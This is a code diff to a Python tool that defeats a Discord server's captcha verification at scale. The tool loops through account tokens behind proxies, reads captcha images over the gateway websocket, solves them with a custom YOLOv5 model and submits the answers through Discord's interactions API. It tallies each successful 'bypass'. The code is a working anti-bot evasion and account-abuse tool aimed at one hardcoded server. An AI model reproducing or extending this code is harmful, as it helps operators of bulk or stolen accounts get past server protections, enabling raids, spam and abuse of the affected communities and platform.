@@ -15,8 +15,18 @@ from pystyle import Center, Anime, Colors, Colorate, System, Write
 from colorama import init, Fore
 
 init()
+if torch.cuda.is_available():
+  device = torch.device("cuda")
+else:
+  device = torch.device("cpu")
+#model = torch.hub.load('ultralytics/yolov5', 'custom', path='bypass/captcha.pt', force_reload=True)
+model = torch.hub.load('ultralytics/yolov5', 'custom', path='bypass/best.pt', force_reload=True)
+#model = torch.hub.load('ultralytics/yolov5', 'yolov5s')  # or yolov5m, yolov5l, yolov5x, custom
+#model.amp = False  # <--- disable AMP inference (solves Windows/conda/CUDA11 issues)
+model.amp = True  # <--- enable AMP inference
 
-model = torch.hub.load('ultralytics/yolov5', 'custom', path='bypass/captcha.pt', force_reload=True)
+
+
 os.system("cls")
 
 text = '''
@@ -26,9 +36,9 @@ text = '''
 
 print(Colorate.Diagonal(Colors.blue_to_purple, Center.XCenter(text)))
 
-channel_id = input('['+ Fore.BLUE + '>' + Fore.RESET + ']' + 'insert the channel id:')
-guild_id = input('['+ Fore.BLUE + '>' + Fore.RESET + ']' + 'insert the guild id:')
-button_id = input('['+ Fore.BLUE + '>' + Fore.RESET + ']' + 'insert the button id:')
+channel_id = '1095065811401584664' #input('['+ Fore.BLUE + '>' + Fore.RESET + ']' + 'insert the channel id:')
+guild_id = '1095065810483028051'#input('['+ Fore.BLUE + '>' + Fore.RESET + ']' + 'insert the guild id:')
+button_id = '1185266006566912032'#input('['+ Fore.BLUE + '>' + Fore.RESET + ']' + 'insert the button id:')
 
 failed = 0
 bypassed = 0
@@ -98,12 +108,12 @@ def process(img, hex_color, tolerance = 20):
         image_data[loop1, loop2] = 0, 0, 0, 0
   return img
 
-def solveCaptcha(url, color = "fcc434") -> str:
+def solveCaptcha(url, color = "30cf80") -> str:
   img = Image.open(requests.get(url, stream=True).raw)
   img = process(img, color)
 
   result = model(img)
-
+  print(result)
   a = result.pandas().xyxy[0].sort_values('xmin')
   while len(a) > 6: 
     lines = a.confidence
@@ -131,7 +141,7 @@ with open("tokens.txt", "r") as f:
     lines = f.readlines()
     for line in lines:
         token, proxy_address = line.strip().split(",")
-        
+        verified = 0
         # Create a dictionary with proxy settings
         proxies = {
             'http': proxy_address,
@@ -242,44 +252,48 @@ with open("tokens.txt", "r") as f:
         },proxies=proxies)    
         
         while True:
-          response = json.loads(ws.recv())
-
-          if response['t'] == 'MESSAGE_CREATE':
-            try:
-              value = response['d']['embeds'][0]['fields'][0]['value']
-              if value == '`Please type the captcha below to be able to access this server!`':
-                message_id = response['d']['id']
-                link = response['d']['embeds'][0]['image']['url']
+            response = json.loads(ws.recv())
+            if response['t'] == 'MESSAGE_CREATE':
+                try:
+                  value = response['d']['embeds'][0]['fields'][0]['value']
+                  if value == '`Please type the captcha below to be able to access this server!`':
+                    message_id = response['d']['id']
+                    link = response['d']['embeds'][0]['image']['url']
+                    ws.close()
+                    break
+                    
+                  embed_description = response['d']['embeds'][0]['description']
+                  if 'You are verified already!' in embed_description:
+                    print("You are already verified. Exiting loop.")
+                    verified=1
+                    print('['+ Fore.GREEN + '+' + Fore.RESET + ']' + f'Verification bypassed correctly with {token[:-5]}.....')
+                    break
+              
+                except:
+                  continue
+        if verified==0:
+            print('['+ Fore.GREEN + '+' + Fore.RESET + ']' + 'Captcha obtained correctly')
+            print('['+ Fore.BLUE + '>' + Fore.RESET + ']' + 'Bypassing captcha...')
+                
+            connect(ws)
+            r = requests.post("https://discord.com/api/v9/interactions", headers=headers, json={"type":3,"nonce":"".join([str(random.randint(1, 9)) for _ in range(19)]),"guild_id":guild_id,"channel_id":channel_id,"message_flags":64,"message_id":message_id,"application_id":application_id,"session_id":"".join(random.choice(string.ascii_letters + string.digits) for _ in range(32)),"data":{"component_type":2,"custom_id":f"mver_{guild_id}_{token_id}"}},proxies=proxies)
+            while True:
+              response = json.loads(ws.recv())
+              if response['t'] == 'INTERACTION_SUCCESS':
+                id_value = response['d']['id']
                 ws.close()
                 break
-              if value == '<:alarm:660789592160600103> **You are verified already!**':
-                print("Verification already completed. Exiting loop.")
-                break
-            except:
-              continue
-        
-        print('['+ Fore.GREEN + '+' + Fore.RESET + ']' + 'Captcha obtained correctly')
-        print('['+ Fore.BLUE + '>' + Fore.RESET + ']' + 'Bypassing captcha...')
+            print(link)
+            captcha = solveCaptcha(link)
+            print('['+ Fore.GREEN + '+' + Fore.RESET + ']' + f'Captcha bypassed: {captcha}')
+            print('['+ Fore.BLUE + '>' + Fore.RESET + ']' + 'Bypassing verification...')
             
-        connect(ws)
-        r = requests.post("https://discord.com/api/v9/interactions", headers=headers, json={"type":3,"nonce":"".join([str(random.randint(1, 9)) for _ in range(19)]),"guild_id":guild_id,"channel_id":channel_id,"message_flags":64,"message_id":message_id,"application_id":application_id,"session_id":"".join(random.choice(string.ascii_letters + string.digits) for _ in range(32)),"data":{"component_type":2,"custom_id":f"mver_{guild_id}_{token_id}"}},proxies=proxies)
-        while True:
-          response = json.loads(ws.recv())
-          if response['t'] == 'INTERACTION_SUCCESS':
-            id_value = response['d']['id']
-            ws.close()
-            break
-
-        captcha = solveCaptcha(link)
-        print('['+ Fore.GREEN + '+' + Fore.RESET + ']' + f'Captcha bypassed: {captcha}')
-        print('['+ Fore.BLUE + '>' + Fore.RESET + ']' + 'Bypassing verification...')
-        
-        r = requests.post("https://discord.com/api/v9/interactions", headers=headers, json={"type":5,"application_id":application_id,"channel_id":channel_id,"guild_id":guild_id,"data":{"id":id_value,"custom_id":f"modalmmbrver_{token_id}","components":[{"type":1,"components":[{"type":4,"custom_id":"answer","value":captcha}]}]},"session_id":"".join(random.choice(string.ascii_letters + string.digits) for _ in range(32)),"nonce":"".join([str(random.randint(1, 9)) for _ in range(19)])},proxies=proxies).json()
-        time.sleep(1)
-        r = requests.get('https://discord.com/api/v9/channels/{channel_id}/messages?limit=50', headers=authorization,proxies=proxies)
-        if r.status_code == 200:
-          failed+=1
-          print('['+ Fore.RED + '!' + Fore.RESET + ']' + f'Verification bypass failed with {token[:-5]}.....')
-        else:
-          bypassed+=1
-          print('['+ Fore.GREEN + '+' + Fore.RESET + ']' + f'Verification bypassed correctly with {token[:-5]}.....')
+            r = requests.post("https://discord.com/api/v9/interactions", headers=headers, json={"type":5,"application_id":application_id,"channel_id":channel_id,"guild_id":guild_id,"data":{"id":id_value,"custom_id":f"modalmmbrver_{token_id}","components":[{"type":1,"components":[{"type":4,"custom_id":"answer","value":captcha}]}]},"session_id":"".join(random.choice(string.ascii_letters + string.digits) for _ in range(32)),"nonce":"".join([str(random.randint(1, 9)) for _ in range(19)])},proxies=proxies)
+            time.sleep(1)
+            r = requests.get('https://discord.com/api/v9/channels/{channel_id}/messages?limit=50', headers=authorization,proxies=proxies)
+            if r.status_code == 200:
+              failed+=1
+              print('['+ Fore.RED + '!' + Fore.RESET + ']' + f'Verification bypass failed with {token[:-5]}.....')
+            else:
+              bypassed+=1
+              print('['+ Fore.GREEN + '+' + Fore.RESET + ']' + f'Verification bypassed correctly with {token[:-5]}.....')
